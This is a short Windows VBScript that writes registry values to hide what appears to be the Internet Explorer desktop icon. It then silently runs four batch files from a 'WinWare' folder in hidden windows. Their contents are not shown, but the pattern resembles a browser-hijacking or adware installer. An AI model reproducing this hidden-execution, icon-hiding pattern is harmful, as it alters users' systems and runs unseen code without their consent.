Dim WSHShell 
Set WshShell = WScript.CreateObject("WScript.Shell")
Rem 
RegPath="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel\{871C5380-42A0-1069-A2EA-08002B30309D}"
RegPath1="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\{871C5380-42A0-1069-A2EA-08002B30309D}"
Type_Name="REG_DWORD"
Key_Data=1
WshShell.RegWrite RegPath,Key_Data,Type_Name
WshShell.RegWrite RegPath1,Key_Data,Type_Name
strDesktop = WSHShell.SpecialFolders("Desktop") 
WSHShell.AppActivate strDesktop 


DIM  objShell
set  objShell=Wscript.createObject("wscript.shell")
objShell.CurrentDirectory = "C:\Program Files\WinWare\"
iReturn=objShell.Run("cmd /C           .\tool.cmd", 0, TRUE)
iReturn=objShell.Run("cmd /C          .\fav\fav.cmd", 0, TRUE)
iReturn=objShell.Run("cmd /C               .\361.cmd", 0, TRUE)
iReturn=objShell.Run("cmd /C           .\360.cmd", 0, TRUE)